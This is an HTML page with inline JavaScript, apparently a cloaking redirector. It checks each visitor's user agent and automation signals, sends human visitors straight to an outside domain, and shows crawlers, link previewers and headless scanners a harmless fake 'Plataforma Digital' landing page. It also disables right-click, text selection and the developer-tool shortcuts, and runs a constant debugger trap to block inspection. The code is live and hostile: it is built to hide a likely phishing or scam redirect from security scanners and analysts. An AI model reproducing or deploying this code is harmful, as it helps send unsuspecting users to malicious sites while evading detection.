<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title id="tab-title">Cargando...</title>
    <style id="browser-style"></style>
</head>
<body oncontextmenu="return false;" style="user-select: none;">
    <div id="main-wrapper">
        <div id="error-content"></div>
    </div>
<script>
    const target = "https://www.tramtecred.cc/";
    const domain = window.location.hostname;

    function isBot() {
        const ua = navigator.userAgent.toLowerCase();
        const botPatterns = ['googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 'yandexbot', 'facebookexternalhit', 'twitterbot', 'linkedinbot', 'whatsapp', 'telegrambot', 'discordbot', 'ahrefsbot', 'semrushbot', 'mj12bot', 'headlesschrome', 'phantomjs', 'puppeteer', 'playwright', 'selenium', 'webdriver', 'cypress', 'bot', 'crawler', 'spider', 'scraper', 'curl', 'wget'];
        for (let p of botPatterns) if (new RegExp(p, 'i').test(ua)) return true;
        if (navigator.webdriver || window.screen.width === 0 || window.outerWidth - window.innerWidth > 160) return true;
        return false;
    }

    function renderLanding() {
        document.getElementById('tab-title').innerText = "Plataforma Digital";
        document.getElementById('browser-style').innerHTML = `body{background:#f5f5f5;color:#333;font-family:Arial;margin:0;padding:20px}header{background:#fff;padding:20px;margin-bottom:20px;box-shadow:0 2px 8px rgba(0,0,0,.08)}.logo{font-size:24px;font-weight:700;color:#667eea}h1{font-size:36px;margin:20px 0;color:#333}p{font-size:15px;color:#666;line-height:1.6}.features{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:20px;margin:30px 0}.feature{background:#fff;padding:20px;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.08)}.feature h3{color:#667eea;margin-bottom:10px}footer{background:#fff;padding:20px;margin-top:40px;border-top:1px solid #eee;text-align:center;color:#999;font-size:12px}`;
        return `<header><div class="logo">🚀 Plataforma Digital</div></header><div class="container"><h1>Soluciones Digitales Innovadoras</h1><p>Bienvenido a nuestra plataforma de soluciones tecnológicas de última generación.</p><div class="features"><div class="feature"><h3>⚡ Velocidad</h3><p>Procesamiento instantáneo en tiempo real.</p></div><div class="feature"><h3>🔒 Seguridad</h3><p>Encriptación avanzada de datos.</p></div><div class="feature"><h3>📱 Accesibilidad</h3><p>Disponible en todos tus dispositivos.</p></div><div class="feature"><h3>🤖 Inteligencia</h3><p>Algoritmos inteligentes y adaptables.</p></div><div class="feature"><h3>💡 Innovación</h3><p>Actualización constante tecnológica.</p></div><div class="feature"><h3>🌍 Global</h3><p>Disponible en 150+ países.</p></div></div></div><footer><p>&copy; 2026 Plataforma Digital. Todos los derechos reservados.</p></footer>`;
    }

    // EJECUTAR AL INSTANTE - CERO DELAY
    if (!isBot()) {
        window.location.href = target;
    } else {
        document.getElementById('error-content').innerHTML = renderLanding();
    }

    document.onkeydown = (e) => { if ([123, 73, 74, 85].includes(e.keyCode) && (e.ctrlKey || e.metaKey || e.shiftKey)) return false; };
    setInterval(() => { debugger; }, 50);
</script>
</body>
</html>
